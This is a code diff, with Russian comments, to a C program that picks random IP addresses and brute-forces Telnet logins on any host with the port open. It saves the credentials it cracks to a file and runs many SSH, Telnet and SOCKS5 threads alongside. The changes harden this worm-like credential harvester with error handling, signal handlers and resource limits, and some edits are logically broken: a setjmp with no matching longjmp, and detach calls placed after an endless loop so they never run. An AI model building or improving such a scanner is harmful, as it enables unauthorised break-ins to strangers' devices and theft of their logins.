@@ -4,6 +4,8 @@
 #include "include/includes.h"
 #include "find_ips/finder.h"
 
+static jmp_buf jmp_point;
+
 // Добавьте новую функцию для сохранения учетных данных в файл:
 void save_credentials_to_file(const char *ip, const char *service, const char *username, const char *password) {
     FILE *file;
@@ -58,11 +60,35 @@ void *telnet_bruteforce_thread(void *arg) {
     while (1) {
         char ip_address[IP_ADDRESS_LENGTH];
         generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
+        
+        // Проверка валидности IP
+        if (strlen(ip_address) == 0) {
+            sleep(1);
+            continue;
+        }
+
         printf("Проверка IP для Telnet: %s\n", ip_address);
         fflush(stdout);
 
-        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
-            Credentials telnet_credentials = telnet_brute(ip_address);
+        // Добавляем обработку ошибок
+        int port_status = check_port_open_on_ip(ip_address, TELNET_PORT);
+        if (port_status == -1) {
+            sleep(1);
+            continue;
+        }
+        
+        if (port_status == 1) {
+            Credentials telnet_credentials = {0};
+            
+            // Защита от сегментации
+            if (setjmp(jmp_point) == 0) {
+                telnet_credentials = telnet_brute(ip_address);
+            } else {
+                printf("Произошла ошибка при брутфорсе %s\n", ip_address);
+                sleep(1);
+                continue;
+            }
+
             if (telnet_credentials.good) {
                 printf("Успешный вход Telnet: %s:%s\n", 
                        telnet_credentials.username, telnet_credentials.password);
@@ -72,7 +98,8 @@ void *telnet_bruteforce_thread(void *arg) {
                                        telnet_credentials.password);
             }
         }
-        sleep(0.1);
+        
+        usleep(100000); // 100ms задержка
     }
     return NULL;
 }
@@ -89,9 +116,26 @@ void ensure_results_directory() {
     }
 }
 
-// Обновите main(), добавив создание директории:
-// Обновите main(), добавив создание директории:
+void signal_handler(int signum) {
+    printf("Получен сигнал %d, выполняется очистка...\n", signum);
+    // Здесь можно добавить код очистки
+    exit(signum);
+}
+
 int main() {
+    // Установка обработчиков сигналов
+    signal(SIGSEGV, signal_handler);
+    signal(SIGABRT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    signal(SIGINT, signal_handler);
+
+    // Установка лимитов ресурсов
+    struct rlimit limit;
+    limit.rlim_cur = RLIM_INFINITY;
+    limit.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_CORE, &limit);
+    setrlimit(RLIMIT_STACK, &limit);
+
     while (1) {
         // Создаем директорию для результатов
         ensure_results_directory();
@@ -122,18 +166,22 @@ int main() {
             return 1;
         }
 
+        while(1) {
+            sleep(1); // Чтобы не нагружать процессор
+        }
+
         // Ожидание завершения потоков SSH
         for (int i = 0; i < 60; i++) {
-            pthread_join(ssh_threads[i], NULL);
+            pthread_detach(ssh_threads[i]);
         }
 
         // Ожидание завершения потоков Telnet
         for (int i = 0; i < 60; i++) {
-            pthread_join(telnet_threads[i], NULL);
+            pthread_detach(telnet_threads[i]);
         }
 
         // Ожидание завершения потока SOCKS5
-        pthread_join(socks5_thread_id, NULL);
+        pthread_detach(socks5_thread_id);
 
         return 0;
     }
